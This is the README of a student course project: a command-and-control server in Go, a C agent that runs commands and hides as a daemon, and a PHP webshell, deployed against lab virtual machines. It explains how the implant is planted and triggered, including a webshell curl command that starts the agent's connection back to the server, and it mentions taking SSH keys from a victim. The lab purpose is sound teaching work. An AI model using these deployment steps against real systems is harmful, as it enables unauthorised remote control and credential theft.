# C2 server project for computer security

## Refined proposal

* Injected agent (socket.c): the software written in C injected on the victim's machine/server that will try to establish a tcp socket with the port and IP address specified in the C code (the address and port of the C2 server). 
    * The agent will receive data from the C2 server and interpret those commands using popen() which executes the command and saves its out put to a file, file that it sends back to the C2 server, making it feel as though we had established a reverse-shell without actualling calling the bash command. I chose to take this approach because it provided a much more persistent connection. Bash reverse shells were very unpredictable and upon entering a wrong command it would terminate the shell, which makes a regular reverse shell very inconvenient for the purposes of a C2 server.
        * With this approach I can also configure the agent to retry for connection even if the submitted command is incorrect.
    * This agent also daemonizes the connection process, using fork() to completely detatch the process from any visual terminal. I did make the process save its pid so it'd be easier to kill it during testing, and I'd decided to leave that in.
    * One important thing to mention about using popen() for the command execution and shell responses is that it is very much a read and write system, aside from having implemted chdir() into the script to allow the user to change directories, the shell is not interactive. That is, the user cannot receive any prompt to action from the victim's terminal like for example entering a password. This is important since the access from being in /var/www is already very limited, but I was able to snoop around the machine and get it's ssh keys from ther files. I still think using popen() was the best choice due to the reliability it brought to the server connections.

* C2 server (main.go): The go instructions for the server. I originally intended to write this server to establish both a connection to any device running the C client and one with the user intending to connect to it. However, I found that amount of work to be a bit much for the time span of this project and also with some research leanred that a lot of C2 servers are hosted remotely and accessed by its user with an ssh connection. I ended up mostly self hosting on port :8080 of my device, but the main.go file runs on any device that supports go and has that port open. 
    * This server has 3 commands:
        1. show-conn, this shows you all active connections on the server, and lets you know if there arent any. it lists in the form of ID -> IP address. I know for certain that this works with at least 2 machines connected to server at the same time,
        2. connect ID, this command connects you to the machine that was assgined the ID displyed by show-conn, if you enter an ID that has not been assign the program will notify that no such a host is connected to the server. Once connected to a host you may interact with it as if you would any other linux machine through the command line (connection will open in the /var/www directory so permissions are limited).
        3. exit, to navigate between the main server prompt and a the host prompts. Once inside a host prompt you may simply type "exit" and it will return to main prompt where can list the available connections again, and choose which host you'd like to connect next.

* The webshell (webshell.php): I don't have much to say about this one, is a one to one copy of the webshell Jeff provided for us in the "reverse shell" assignment. Don't fix something if it wokrs! 
    * It will work in the same fashion Jeff described, with the caveat that I had to make sure PHP compatibility was enabled in my server.

## Instructions

Now for some instructions on how to get the project to work. I used to VMs along with my machine to make my project work, I will assume 3 linux machines that can talk to each other over a network (1 attacker, 2 victims). You should also make sure you have golang running on your attacker machine, and on the server if you don't self host it like me (You may find instructions on setting up golang here: https://go.dev/doc/install). I will also assume you have some C compiles in the victims machines and that you know which one it is (gcc or clang).

1. Pull the repository into you own device (duh!)
2. Once on the directory with your go files (main.go and go.mod):
    * Run the command "go mod tidy" to ensure you have all the right dependiencies for the used libraries
    * Run "go build -o server"
        * This will create the executable binary for the server
        * IMPORTANT!!! Ensure port :8080 is open in your attacking device as it is the one hardcoded into the server, you may change the port number on line 22 of main.go if you wish to use a different port for it (keep in mind that if you do this you'll also need to change the port number on the socket.c binary for the agent to be injected).
    * Run the server as you would any other binary "./server"
        * You should now see the main prompt for the server "C2-Main>" indicating that you're properly logged into the server, you may start trying commands although all two them should tell you that there are currently no connections.
        * The server will notify you once a host has connected to it with some text
3. agent (socket.c) and webshell (webshell.php) injection: 
    * This part of the project is a bit more freestyle since this projects is meant to demo the server model and how to start it, not do a deep dive on frequently successful infection strategies. 
        * I personally just used netcat on both victim machines to recieve the code directly in the /var/www/html directory.
        * I also assume both machines host their apache2 servers in that directory and that they've enabled php in said services
        * You should also makes sure that the port the apache2 service (httpd in fedora, but same thing) 
    * After having started the Apache2 server on both victim machines and having the infected software inside their /var/www/html folders (in whicherver way you prefer to get them there) you may either use "curl http://VICTIM_IP_ADDRESS/webshell.php?command=./socket" or paste the same url into some browser using the same url.
        * I have a confession to make here, I could not manage to get the agent to run on the virtual machine when it was statically compiled, so that the binary could run simply after being transferred over. As a result, I'm assuming that the attacker would put both socket.c on the system and some script that would compile it while already in the victim's system or maybe even compiling it themselves during the injection attack (The issue is not related to architecture, but I didn't have the time to sort out this one particularity, so youll have to manually compile the code within the victim's system).
4. Play around!!!
    * After connecting the hosts to the attacker machine you should be able to connect to them individually using the "connect ID" where ID is the number assigned to that host. 

